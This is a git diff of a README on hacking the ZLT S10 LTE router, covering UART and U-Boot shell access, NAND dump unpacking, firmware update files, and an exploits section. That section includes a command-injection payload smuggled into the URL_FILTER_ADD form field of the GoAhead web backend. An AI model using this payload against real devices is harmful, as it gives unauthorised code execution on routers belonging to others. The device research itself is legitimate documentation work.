@@ -176,8 +176,78 @@ As shown in the image (orange box), there are a set of three pinholes. You can s
 For software, you can use terminal applications like PuTTY on Windows, screen on Linux, or other similar tools to interact with the UART interface.
 
 
-### Exploiting RCE Vulnerabilities
-Certain Remote Code Execution (RCE) vulnerabilities stem from improper parsing, handling, or sanitization of arguments passed into the GoAhead backend. Although many of these flaws have been addressed and patched in recent firmware updates, some may still be present in older versions.
+#### U-Boot Shell over UART
+
+During the device boot process, `U-Boot` is responsible for performing file system checks and loading the Linux kernel. If an error occurs during this stage such as a checksum failure or file system corruption, U-Boot will halt and drop into an interactive shell (hushshell), which is only accessible via UART (serial interface).
+
+This shell provides low-level access to the device and is typically used for diagnostics and recovery. The following commands are commonly available in this shell:
+
+| Command |  Description |
+| -------- | --------------------------- |
+| 0        | do nothing, unsuccessfully  |
+| 1        | do nothing, successfully |
+| ?        | alias for 'help' |
+| badblock_query | is support bad block query |
+| base     | print or set address offset |
+| bbt_count | bbt_count |
+| bdinfo   | print Board Info structure |
+| bootm    | boot application image from memory |
+| bootz    | NAND sub-system |
+| cmp      | memory compare |
+| compat_read | upload: compat_read [partition][offset][size] |
+| compat_write | download: compat_write [partition][offset][size] |
+| coninfo  | print console devices and information |
+| cp       | memory copy |
+| crc      | crc_check |
+| crc32    | checksum calculation |
+| dcache   | enable or disable data cache |
+| dl       | dl : dl [sign] |
+| downloader | Perform ZIXC TSP downloader |
+| downver  | upgrade software downloaded from TFTP server |
+| echo     | echo args to console |
+| editenv  | edit environment variable |
+| efuse_program | efuse_program: program [puk_hash/secure_en/chip_flag] [hash0/enable/SPE][hash1][hash2][hash3] |
+| efuse_read | efuse_read: read [devid] |
+| env      | environment handling commands |
+| erase    | Erase nand: erase [partition] |
+| exit     | exit script |
+| fsinfo   | print information about filesystems |
+| fsload   | load binary file from a filesystem image |
+| getvar   | Downloader get information: getvar [info] |
+| go       | start application at address 'addr' |
+| help     | print command description/usage |
+| icache   | enable or disable instruction cache |
+| loop     | infinite loop on address range |
+| ls       | list files in a directory (default /) |
+| md       | memory display |
+| mm       | memory modify (auto-incrementing address) |
+| mtest    | simple RAM read/write test |
+| mw       | memory write (fill) |
+| nand     | NAND sub-system |
+| nm       | memory modify (constant address) |
+| nor      | SPINAND sub-system |
+| part_bbc | partition bad block count |
+| part_valid_space_query | get partition valid physics space size |
+| ping     | send ICMP ECHO_REQUEST to network host |
+| printenv | print environment variables |
+| ram_start | ram_start: ram_start |
+| read_board_type | read board type. |
+| reboot   | reboot: reboot |
+| reset    | Perform RESET of the CPU |
+| run      | run commands in an environment variable |
+| set      | set : set [module] [size] |
+| setenv   | set environment variables |
+| showvar  | print local hushshell variables |
+| single_part_bbc | single partition bad block count |
+| test     | minimal test like /bin/sh |
+| testusb  | testusb: testusb [size] |
+| tftp     | boot image via network using TFTP protocol |
+| tftpput  | TFTP put command, for uploading files to a server |
+| version  | print monitor, compiler and linker version |
+
+
+### Exploiting Vulnerabilities
+Certain Code Execution vulnerabilities stem from improper parsing, handling, or sanitization of arguments passed into the GoAhead backend. Although many of these flaws have been addressed and patched in recent firmware updates, some may still be present in older versions.
 
 Exploit 1
 ```shell
@@ -193,6 +263,8 @@ method: POST
 payload: {'isTest':'false', 'goformId':'URL_FILTER_ADD', 'addURLFilter':'http://just_another_text/&&<COMMAND>&&'}
 ```
 ---
+
+
 
 ## Openline/Unlock/Debrand
 
@@ -256,13 +328,78 @@ To read the chip, you will need a NAND Flash chip reader, such as the CH341. Add
 
 ## Parsing the Raw Dump
 
-## Extract
+### Unpacking/Repacking
 
-https://gist.github.com/adamvr/1079762
+Unpacking a SPI NAND dump requires the understanding of the physical NAND layout, including pages, blocks, out-of-band (OOB) data, and bad block management. Manually handling this process can be complex and error-prone. To simplify it, I’ve created a small utility script called `dump_parser.py`, which assists in unpacking and repacking NAND firmware dumps.
 
-```shell
-file uImage1.bin
+This script is wrote specifically for the NAND structure of the `DS35M1GA-IB` chip and the partition layout used in the `ZLT S10` device. As such, it is only compatible with this particular combination unless you adapt the script to match your own device's configuration.
 
-# uImage1.bin: u-boot legacy uImage, ZX297520, Firmware/ARM, OS Kernel Image (Not compressed), 327152 bytes, Thu Sep 24 10:55:23 2020, Load Address: 0X23DF0000, Entry Point: 0X23DF0000, Header CRC: 0X11195B5, Data CRC: 0XCE15A0CE
-```
-Since both images are loaded into the memory and start execution at the starting points of the images, these images are kernel images. They are not contains any file systems.
+When unpacked, the firmware is divided into the following partitions:
+
+| Name   | File System |
+| ----------- | ------- |
+| zloader | No  |
+| uboot | No  |
+| uboot-mirr | No  |
+| nvrofs | Yes  |
+| imagefs | Yes  |
+| rootfs | Yes  |
+| userdata | Yes  |
+| yaffs | Yes  |
+
+> [!NOTE]
+> Partitions without a file system contain raw binary data such as bootloaders, preloaders or low-level configuration. File system partitions can be mounted or explored using standard Linux tools once extracted.
+
+## Firmware/Configuration Update
+
+The ZLT S10 supports firmware and configuration updates through several methods. These include:
+- Remote update via management server (CWMP)
+- TFTP-based recovery mode
+- The device’s web interface
+
+### Update Methods
+
+1. Management Server (CWMP)
+
+Firmware and configuration updates are often performed automatically by the Internet Service Provider (ISP) using CWMP (CPE WAN Management Protocol). This is a hands-off, scheduled process controlled remotely and is not intended for manual use.
+
+2. TFTP (Recovery Mode)
+U-Boot provides a low-level recovery mechanism that allows firmware flashing via TFTP. However, this mode is only accessible when there’s a critical issue such as a corrupted file system or kernel checksome fail. Even if you manage to access this interface, flashing via TFTP is challenging. It requires in-depth knowledge of low-level memory mapping and command-line tools within U-Boot.
+
+3. Web Interface
+The device’s web interface offers a more user-friendly method for firmware or configuration updates. However, based on testing, this method is not backward compatible. Even if your device hasn’t received updates in a while, a future update pushed by the ISP might not be compatible with your current firmware. This is because ISPs frequently change:
+
+- Flashing procedures
+- Firmware encryption mechanisms
+- Integrity verification methods
+
+> [!CAUTION]
+> Using an incompatible firmware may brick the device or lock out access to features.
+
+### Firmware Bundle Contents
+Older firmware versions used a script named `updateit` to initiate the update process. In more recent firmware releases, this script is deprecated. The update process is now handled by internal scripts, often embedded directly into the previous firmware release.
+
+#### Required Files in Firmware Bundles
+
+| File Name | Purpose |
+| --------- | ------- |
+| imagefs.tgz | Contains some binary images |
+| rootfs.tgz | Contains the root filesystem |
+| md5.txt | Verifies integrity of the firmware files |
+
+#### Additional Required Files in Newer Firmware Versions
+
+| File Name | Purpose |
+| --------- | ------- |
+| set_fotaflag | Flags the system to begin a firmware update |
+| re_rc | Replacement script for recovery startup routines |
+| rc | Replacement script for normal startup routines |
+| encrypt.txt | Likely used to check firmware integrity |
+
+#### Configuration Updates
+
+Some firmware bundles also include a configuration update file:
+
+| File Name | Purpose |
+| --------- | ------- |
+| configupdate.zip | Contains system configuration settings |
